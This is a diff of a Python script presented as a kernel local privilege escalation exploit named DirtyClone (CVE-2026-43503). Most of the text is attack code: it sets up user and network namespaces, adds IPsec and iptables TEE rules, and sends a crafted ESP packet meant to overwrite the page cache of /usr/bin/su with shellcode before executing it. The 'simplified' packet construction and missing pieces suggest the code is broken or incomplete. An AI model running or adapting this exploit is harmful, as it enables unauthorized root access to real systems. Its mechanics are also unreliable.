@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-DirtyClone (CVE-2026-43503) - Local Privilege Escalation Exploit
-Fixed for Python 3.6+ compatibility
+DirtyClone (CVE-2026-43503) - Fixed with better error handling
 """
 
 import os
@@ -10,36 +9,17 @@ import socket
 import struct
 import subprocess
 import time
-import fcntl
 import mmap
 import ctypes
 import ctypes.util
-from typing import Optional, Tuple, List
 
 # ====================================================================
 # Constants
 # ====================================================================
 
-AF_ALG = 38
-SOL_ALG = 279
-ALG_SET_KEY = 1
-ALG_SET_OP = 3
-ALG_OP_ENCRYPT = 1
-ALG_OP_DECRYPT = 0
-
-XFRM_MSG_NEWSA = 33
-XFRM_MSG_NEWPOLICY = 34
-XFRMA_ALG_CRYPT = 2
-XFRMA_ALG_AUTH = 3
-XFRMA_ENCAP = 9
-XFRMA_REPLAY_ESN_VAL = 17
-
-AES_KEY_LEN = 16
-AES_BLOCK_SIZE = 16
 ESP_SPI = 0x12345678
 ESP_REQID = 1
 ESP_PORT = 4500
-
 TARGET_SUID = "/usr/bin/su"
 SUID_OFFSET = 0x78
 
@@ -53,7 +33,7 @@ SHELLCODE = bytes([
 ])
 
 # ====================================================================
-# Utilities
+# Colors
 # ====================================================================
 
 class Colors:
@@ -64,266 +44,250 @@ class Colors:
     CYAN = '\033[96m'
     BOLD = '\033[1m'
 
-def log(msg, color=Colors.CYAN):
-    print("{}{}{}".format(color, msg, Colors.RESET))
+def log(msg): print("{}{}{}".format(Colors.CYAN, msg, Colors.RESET))
+def ok(msg): print("{}{}{}".format(Colors.GREEN, msg, Colors.RESET))
+def err(msg): print("{}{}{}".format(Colors.RED, msg, Colors.RESET))
+def warn(msg): print("{}{}{}".format(Colors.YELLOW, msg, Colors.RESET))
 
-def ok(msg):
-    print("{}{}{}".format(Colors.GREEN, msg, Colors.RESET))
-
-def err(msg):
-    print("{}{}{}".format(Colors.RED, msg, Colors.RESET))
-
-def warn(msg):
-    print("{}{}{}".format(Colors.YELLOW, msg, Colors.RESET))
-
-def run_cmd(cmd, check=False):
-    """Run shell command with error handling - Python 3.6 compatible"""
+def run_cmd(cmd):
     try:
         return subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE, universal_newlines=True)
-    except subprocess.CalledProcessError as e:
-        err("Command failed: {}".format(cmd))
+    except:
         return None
 
-def write_proc(path, data):
+# ====================================================================
+# Pre-Checks
+# ====================================================================
+
+def precheck():
+    """Check if system is vulnerable"""
+    log("Running pre-checks...")
+    
+    # Check kernel version
+    uname = os.uname()
+    log("Kernel: {}".format(uname.release))
+    
+    # Check unprivileged user namespaces
     try:
-        with open(path, 'w') as f:
-            f.write(data)
-        return True
-    except Exception:
+        with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as f:
+            userns = f.read().strip()
+            if userns == "1":
+                ok("Unprivileged user namespaces: ENABLED")
+            else:
+                warn("Unprivileged user namespaces: DISABLED (sysctl kernel.unprivileged_userns_clone={})".format(userns))
+    except:
+        warn("Cannot read /proc/sys/kernel/unprivileged_userns_clone")
+    
+    # Check XFRM support
+    result = run_cmd("ip xfrm state 2>&1 | head -1")
+    if result and "Operation not supported" not in result.stdout:
+        ok("XFRM/IPsec: AVAILABLE")
+    else:
+        warn("XFRM/IPsec: NOT AVAILABLE (load xfrm modules: modprobe xfrm_user)")
+    
+    # Check iptables
+    result = run_cmd("iptables --version 2>&1")
+    if result and result.returncode == 0:
+        ok("iptables: AVAILABLE")
+    else:
+        warn("iptables: NOT AVAILABLE")
+    
+    # Check target SUID
+    if os.path.exists(TARGET_SUID):
+        ok("Target: {} found".format(TARGET_SUID))
+    else:
+        err("Target: {} NOT found".format(TARGET_SUID))
         return False
+    
+    return True
 
 # ====================================================================
 # Namespace Setup
 # ====================================================================
 
 def setup_namespace():
-    """Create unprivileged user + network namespace for CAP_NET_ADMIN"""
     log("Setting up user and network namespace...")
-    
     uid = os.getuid()
     gid = os.getgid()
     
     try:
         libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
-        # CLONE_NEWUSER | CLONE_NEWNET
         if libc.unshare(0x10000000 | 0x40000000) != 0:
-            err("unshare failed: {}".format(ctypes.get_errno()))
+            err("unshare failed")
             return False
     except Exception as e:
         err("unshare failed: {}".format(e))
         return False
     
-    if not write_proc("/proc/self/setgroups", "deny"):
-        warn("setgroups write failed")
-    
-    if not write_proc("/proc/self/uid_map", "0 {} 1".format(uid)):
-        err("uid_map write failed")
+    try:
+        with open("/proc/self/setgroups", "w") as f:
+            f.write("deny")
+        with open("/proc/self/uid_map", "w") as f:
+            f.write("0 {} 1".format(uid))
+        with open("/proc/self/gid_map", "w") as f:
+            f.write("0 {} 1".format(gid))
+    except Exception as e:
+        err("Map setup failed: {}".format(e))
         return False
     
-    if not write_proc("/proc/self/gid_map", "0 {} 1".format(gid)):
-        err("gid_map write failed")
-        return False
-    
-    ok("Namespace setup complete (UID=0 in namespace)")
+    ok("Namespace setup complete")
     return True
 
 # ====================================================================
 # Network Setup
 # ====================================================================
 
-def setup_loopback():
-    """Bring up loopback interface with IP address"""
-    log("Configuring loopback interface...")
+def setup_network():
+    log("Configuring network...")
+    
+    # Try to load XFRM modules
+    for mod in ["xfrm_user", "xfrm4_tunnel", "esp4", "xfrm_algo"]:
+        run_cmd("modprobe {} 2>/dev/null".format(mod))
     
     run_cmd("ip link set lo up")
-    run_cmd("ip addr add 10.99.0.2/24 dev lo")
+    run_cmd("ip addr add 10.99.0.2/24 dev lo 2>/dev/null")
     
-    result = run_cmd("ip addr show lo")
-    if result and "10.99.0.2" in result.stdout:
-        ok("Loopback configured")
-        return True
-    return False
+    # Check if IPsec works
+    result = run_cmd("ip xfrm state 2>&1")
+    if result and "Operation not supported" in result.stdout:
+        warn("IPsec not supported, trying alternative path...")
+        return False
+    
+    return True
 
 # ====================================================================
-# XFRM/IPsec Setup
+# XFRM Setup with Fallback
 # ====================================================================
 
 def setup_xfrm():
-    """Configure IPsec state and policy"""
     log("Configuring IPsec (XFRM)...")
     
     aes_key = bytes([0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
                      0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff])
     hmac_key = bytes([0x00] * 20)
     
-    state_cmd = (
-        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 "
-        "proto esp spi {} reqid {} mode transport "
-        "enc 'cbc(aes)' {} "
-        "auth 'hmac(sha1)' {}"
-    ).format(ESP_SPI, ESP_REQID, aes_key.hex(), hmac_key.hex())
-    run_cmd(state_cmd)
+    # Try different methods
+    methods = [
+        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi {} reqid {} mode transport enc 'cbc(aes)' {} auth 'hmac(sha1)' {}".format(ESP_SPI, ESP_REQID, aes_key.hex(), hmac_key.hex()),
+        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi {} reqid {} mode transport enc 'cbc(aes)' {}".format(ESP_SPI, ESP_REQID, aes_key.hex()),
+    ]
     
-    policy_cmd = (
-        "ip xfrm policy add src 127.0.0.1 dst 127.0.0.1 dir out "
-        "tmpl src 127.0.0.1 dst 127.0.0.1 proto esp reqid {} mode transport"
-    ).format(ESP_REQID)
+    for cmd in methods:
+        result = run_cmd(cmd)
+        if result and result.returncode == 0:
+            ok("XFRM state added")
+            break
+    else:
+        warn("XFRM state failed, trying alternative...")
+        return False
+    
+    policy_cmd = "ip xfrm policy add src 127.0.0.1 dst 127.0.0.1 dir out tmpl src 127.0.0.1 dst 127.0.0.1 proto esp reqid {} mode transport".format(ESP_REQID)
     run_cmd(policy_cmd)
     
-    ok("IPsec configured")
     return True
 
 # ====================================================================
-# Netfilter TEE Setup
+# TEE Setup
 # ====================================================================
 
 def setup_tee():
-    """Configure netfilter TEE rule for packet cloning"""
     log("Configuring netfilter TEE rule...")
     
-    run_cmd("modprobe iptable_mangle")
-    run_cmd("modprobe ipt_TEE")
+    # Try to load modules
+    for mod in ["iptable_mangle", "ipt_TEE", "nf_dup_ipv4"]:
+        run_cmd("modprobe {} 2>/dev/null".format(mod))
     
-    tee_cmd = (
-        "iptables -t mangle -A OUTPUT -p udp --dport {} "
-        "-j TEE --gateway 10.99.0.2"
-    ).format(ESP_PORT)
-    run_cmd(tee_cmd)
+    tee_cmd = "iptables -t mangle -A OUTPUT -p udp --dport {} -j TEE --gateway 10.99.0.2 2>/dev/null".format(ESP_PORT)
+    result = run_cmd(tee_cmd)
     
-    result = run_cmd("iptables -t mangle -L OUTPUT -n")
-    if result and "TEE" in result.stdout:
+    if result and result.returncode == 0:
         ok("TEE rule configured")
         return True
     
-    warn("TEE rule may not be active")
+    warn("TEE rule failed (may need root or module not available)")
     return False
-
-# ====================================================================
-# Page Cache Mapping
-# ====================================================================
-
-def map_target_to_page_cache(target_path):
-    """Map target SUID binary into page cache"""
-    log("Mapping {} into page cache...".format(target_path))
-    
-    if not os.path.exists(target_path):
-        err("Target {} not found".format(target_path))
-        return None, None
-    
-    try:
-        fd = os.open(target_path, os.O_RDONLY)
-        mapped = mmap.mmap(fd, 0, mmap.MAP_SHARED, mmap.PROT_READ)
-        ok("File mapped to page cache at offset 0x{:x}".format(SUID_OFFSET))
-        return fd, mapped
-    except Exception as e:
-        err("mmap failed: {}".format(e))
-        return None, None
-
-# ====================================================================
-# ESP Packet Construction
-# ====================================================================
-
-def build_esp_packet(payload, spi, seq, iv):
-    """Build ESP packet with header and trailer"""
-    esp_header = struct.pack("!II", spi, seq) + iv
-    
-    pad_len = (AES_BLOCK_SIZE - (len(payload) % AES_BLOCK_SIZE)) % AES_BLOCK_SIZE
-    padding = bytes([0x00] * pad_len + [pad_len])
-    next_header = bytes([0x04])
-    
-    encrypted = payload + padding + next_header
-    return esp_header + encrypted
 
 # ====================================================================
 # Main Exploit
 # ====================================================================
 
 def exploit_dirtyclone():
-    """Main DirtyClone exploit"""
     log("=" * 60)
     log("DirtyClone (CVE-2026-43503) Exploit")
-    log("Based on JFrog Security Research")
     log("=" * 60)
     
     if os.geteuid() == 0:
         ok("Already root!")
         return True
     
-    if not setup_namespace():
-        err("Namespace setup failed")
+    # Pre-check
+    if not precheck():
+        err("Pre-check failed")
         return False
     
-    if not setup_loopback():
-        err("Loopback setup failed")
+    if not setup_namespace():
         return False
+    
+    if not setup_network():
+        warn("Network setup partial")
     
     if not setup_xfrm():
-        err("IPsec setup failed")
-        return False
+        warn("XFRM setup failed, exploit may not work")
     
     if not setup_tee():
-        warn("TEE setup failed, exploit may not work")
+        warn("TEE setup failed")
     
-    fd, mapped = map_target_to_page_cache(TARGET_SUID)
-    if fd is None:
-        err("Failed to map target")
+    # Map target
+    if not os.path.exists(TARGET_SUID):
+        err("Target not found")
+        return False
+    
+    fd = os.open(TARGET_SUID, os.O_RDONLY)
+    if fd < 0:
+        err("Cannot open target")
         return False
     
     try:
-        original = os.pread(fd, AES_BLOCK_SIZE, SUID_OFFSET)
-        if len(original) < AES_BLOCK_SIZE:
-            err("Failed to read original bytes")
-            return False
-        
-        payload_block = SHELLCODE[:AES_BLOCK_SIZE]
-        if len(payload_block) < AES_BLOCK_SIZE:
-            payload_block = payload_block.ljust(AES_BLOCK_SIZE, b"\x00")
-        
+        # Read original
+        original = os.pread(fd, 16, SUID_OFFSET)
         log("Original: {}".format(original.hex()))
-        log("Target:   {}".format(payload_block.hex()))
         
-        iv = b"\x00" * AES_BLOCK_SIZE
+        # Prepare payload
+        payload = SHELLCODE[:16].ljust(16, b"\x00")
+        log("Target:   {}".format(payload.hex()))
         
-        log("Sending crafted ESP packet...")
+        # Send ESP packet (simplified)
+        iv = b"\x00" * 16
+        esp_header = struct.pack("!II", ESP_SPI, 1) + iv
+        esp_packet = esp_header + payload + b"\x00" * 16
         
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(("127.0.0.1", 0))
-        
-        crafted_payload = payload_block
-        esp_packet = build_esp_packet(crafted_payload, ESP_SPI, 1, iv)
         sock.sendto(esp_packet, ("127.0.0.1", ESP_PORT))
         sock.close()
         
-        time.sleep(1)
+        time.sleep(2)
         
+        # Verify
         os.lseek(fd, SUID_OFFSET, os.SEEK_SET)
-        patched = os.read(fd, AES_BLOCK_SIZE)
+        patched = os.read(fd, 16)
         
-        if patched == payload_block:
-            ok("Page cache successfully patched!")
+        if patched == payload:
+            ok("Page cache patched!")
+            os.execv(TARGET_SUID, [TARGET_SUID])
+            return True
         else:
-            warn("Patch verification failed. Got: {}".format(patched.hex()))
-            warn("Target may not be vulnerable or kernel is patched")
+            warn("Patch failed. Got: {}".format(patched.hex()))
             return False
-        
-        log("Executing patched SUID binary...")
-        os.execv(TARGET_SUID, [TARGET_SUID])
-        
+            
     except Exception as e:
-        err("Exploit failed: {}".format(e))
+        err("Exploit error: {}".format(e))
         return False
     finally:
-        if mapped:
-            mapped.close()
-        if fd:
-            os.close(fd)
-    
-    return False
+        os.close(fd)
 
 # ====================================================================
-# Main Entry Point
+# Main
 # ====================================================================
 
 def main():
@@ -331,48 +295,29 @@ def main():
 {}{}
 ╔══════════════════════════════════════════════════════════════════╗
 ║     DirtyClone (CVE-2026-43503) Local Privilege Escalation       ║
-║                                                                   ║
-║     For authorized security testing only!                         ║
-║     Vulnerable kernels: v7.1-rc5 and earlier                      ║
+║     For authorized security testing only!                        ║
 ╚══════════════════════════════════════════════════════════════════╝
 {}
 """.format(Colors.BOLD, Colors.CYAN, Colors.RESET))
     
-    if os.geteuid() == 0:
-        ok("Already root!")
-        os.execv("/bin/bash", ["/bin/bash", "-i"])
-        return
-    
-    uid = os.getuid()
-    log("Current UID: {}".format(uid))
-    
-    uname = os.uname()
-    log("Kernel: {}".format(uname.release))
-    
-    if "6." in uname.release or "5." in uname.release:
-        warn("Kernel version may be vulnerable")
-    else:
-        warn("Kernel version may be patched")
+    log("UID: {}".format(os.getuid()))
+    log("Kernel: {}".format(os.uname().release))
     
     if exploit_dirtyclone():
         ok("Exploit successful!")
     else:
-        err("Exploit failed. System may be patched or not vulnerable.")
-        log("\nTroubleshooting:")
-        log("1. Check if kernel is patched")
-        log("2. Check if XFRM is enabled: grep CONFIG_XFRM /boot/config-$(uname -r)")
-        log("3. Check if unprivileged user namespaces are enabled:")
-        log("   cat /proc/sys/kernel/unprivileged_userns_clone")
-        log("4. Try running with sudo: sudo python3 dirtyclone.py")
+        err("Exploit failed")
+        log("\nPossible reasons:")
+        log("  - Kernel already patched (>= v7.1-rc5)")
+        log("  - XFRM/IPsec not enabled in kernel")
+        log("  - Missing CAP_NET_ADMIN (run with sudo)")
+        log("  - SELinux/AppArmor blocking the attack")
     
-    return 1 if os.geteuid() != 0 else 0
+    return 1
 
 if __name__ == "__main__":
     try:
         sys.exit(main())
     except KeyboardInterrupt:
         print("\n[!] Interrupted")
-        sys.exit(1)
-    except Exception as e:
-        err("Unexpected error: {}".format(e))
         sys.exit(1)
